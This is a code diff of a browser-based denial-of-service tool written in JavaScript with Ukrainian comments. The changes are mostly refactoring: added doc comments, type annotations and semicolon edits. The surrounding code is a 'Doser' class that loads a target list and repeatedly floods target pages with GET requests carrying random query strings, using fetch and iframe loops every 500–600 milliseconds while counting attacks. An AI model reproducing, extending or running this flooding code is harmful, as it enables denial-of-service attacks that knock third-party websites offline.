@@ -1,20 +1,23 @@
+/**Інтервал для `fetch` атаки*/
 const fetchAttackInterval = 500;
+/**Інтервал для `<iframe>` атаки*/
 const iframeAttackInterval = 600;
+
 
 /**
  * Зберігання данних про атаки
  */
-function add_count(e) {
+function add_count() {
 	if (!lockAttackCount) {
 		attacks.text(parseInt(attacks.text()) + 1);
 
     	(d=>d.attacks = (d.attacks ? parseInt(d.attacks) : 0) + 1)(Database)
 	} 
-}
+};
 
 /**
  * Показ цілі користувачу
- * @param {?JSON} target **Ціль**
+ * @param {?object} target **Ціль**
  */
 function setTarget(target) {
 	if (target) {
@@ -22,11 +25,12 @@ function setTarget(target) {
 	    methodField.text("GET");
 	    return true
 	}
-}
+};
 
 /**
  * Генерація **GET** запиту
- * @param {JSON} target **Ціль**
+ * @param {object} target **Ціль**
+ * @returns **URL**
  */
 const composeVictim = async target => `${target.page}?q=${floodString(64)}`;
 
@@ -36,7 +40,7 @@ const composeVictim = async target => `${target.page}?q=${floodString(64)}`;
 class Doser {
 	/**
 	 * Запуск атаки
-	 * @param {Boolean} isFetch
+	 * @param {boolean} isFetch
 	 */
     async start(isFetch=true) {
     	this.attack = true; // Статус атаки
@@ -46,20 +50,23 @@ class Doser {
         btn.text("Стоп");
 
         // Створення сповіщення про завантаження цілей
+		// Тут теж буде рефакторинг
         (l=>{if (l[0]) l.remove()})($("#load"));
 		$("<p>", {id:"load"}).text("Завантажуємо цілі...").appendTo(box);
 
+		/**Ціль*/
         const target = await getTarget();
 
+		// Якщо цілі не завантажились
         if (!setTarget(target)) {
         	// Якщо не завнтажились цілі
 
         	$("#load").text("Помилка завантаження!");
-    		alert("Ой!", "Помилка!", "Перевірте підключення до інтернету!")
+    		alert("Ой!", "Помилка!", "Перевірте підключення до інтернету!");
 
         	this.attack = false;
         	btn.text("Старт!");
-        	return; // Стоп
+        	return // Стоп
         };
         console.log(target);
 
@@ -81,7 +88,7 @@ class Doser {
 
         	add_count();
 
-        	if ($("#frames")[0].childElementCount >= 100) Frames.clear();
+        	if ($("#frames")[0].childElementCount >= 100) Frames.clear()
         }, iframeAttackInterval)
     };
 	/**
@@ -96,5 +103,5 @@ class Doser {
 	    	console.clear();
 	    	btn.text("Старт!")
     	}
-    };
+    }
 }
